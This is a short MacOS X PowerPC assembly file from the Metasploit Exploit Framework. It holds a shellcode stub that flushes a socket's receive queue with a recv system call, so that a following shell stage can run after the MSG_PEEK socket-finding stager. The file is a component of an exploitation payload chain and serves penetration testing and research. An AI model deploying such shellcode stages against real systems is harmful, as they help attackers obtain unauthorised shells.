;;
;
;        Name: stub_sock_find_peek_flusher.asm
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This stub will flush the recv queue and continue 
;        execution. It can be used a prefix before a shell
;        stage when using the MSG_PEEK stager.
;
;;

.globl _main
.text
_main:
	li		r0, 102
	mr		r3, r30
	subi	r4, r1, 0xfff * 2
	li		r5, 0xfff
	xor		r6, r6, r6
	.long	0x44ffff02
	xor.	r6, r6, r6
